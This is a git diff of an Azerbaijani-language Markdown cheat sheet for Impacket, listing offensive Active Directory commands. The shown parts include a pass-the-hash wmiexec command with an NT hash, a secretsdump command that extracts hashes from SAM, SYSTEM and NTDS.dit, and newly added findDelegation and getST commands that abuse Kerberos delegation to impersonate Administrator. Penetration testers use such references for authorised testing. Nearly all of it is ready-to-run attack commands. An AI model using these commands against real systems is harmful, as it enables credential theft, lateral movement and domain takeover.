@@ -6,7 +6,7 @@
 
 ## 📂 Kateqoriyalar
 
-1. Remote Execution (Uzaqdan İcra
+1. Remote Execution (Uzaqdan İcra)
 2. Credential Dumping (Məlumatların Çıxarılması
 3. Relay & MITM Attacks
 4. Active Directory Enumeration
@@ -97,3 +97,15 @@ python3 wmiexec.py istifadeci@192.168.1.100 -hashes :5fbc3d8433ecf0840c83a7d2f9b
 
 #### Extract the Hashes
 `impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL`
+
+### impacket-findDelegation
+
+Active Directory mühitində Kerberos delegasiya zəifliklərini tapmaq üçün istifadə olunan Impacket alətidir.  
+`imapcket-findDelegation '<domen>/<username>':<password> -dc-ip <ip>`
+
+### impacket-getST
+Kerberos Service Ticket (TGS) almaq və həmin bileti başqa istifadəçi kimi (impersonation) istifadə etmək üçün işlədilən Impacket alətidir.  
+`impacket-getST -spn <delegation user/domen> -impersonate Administrator "<domen>/<username>:<password>" -dc-ip <ip>`
+
+
+
